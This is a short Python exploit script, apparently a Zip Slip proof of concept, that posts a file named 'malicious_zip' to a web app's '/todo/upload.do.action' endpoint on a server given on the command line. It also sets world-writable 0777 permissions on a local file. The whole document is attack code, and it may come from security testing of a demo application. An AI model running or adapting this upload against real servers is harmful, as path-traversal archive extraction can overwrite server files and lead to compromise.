#! /usr/bin/env python

# to run: `python zip-slip.py http://SERVER-IP:SERVER-PORT`

import requests
import os
import sys

malicious_zip = os.path.join(os.path.dirname(__file__), 'zip-slip.zip')
url = (sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080') + '/todo/upload.do.action'
files = {'upload': ('zip-slip.zip', open(malicious_zip, 'rb'), 'application/zip')}
# os.chmod("file_name" , 0777)

os.chmod("file", 0o0777)
requests.post(url, files=files)
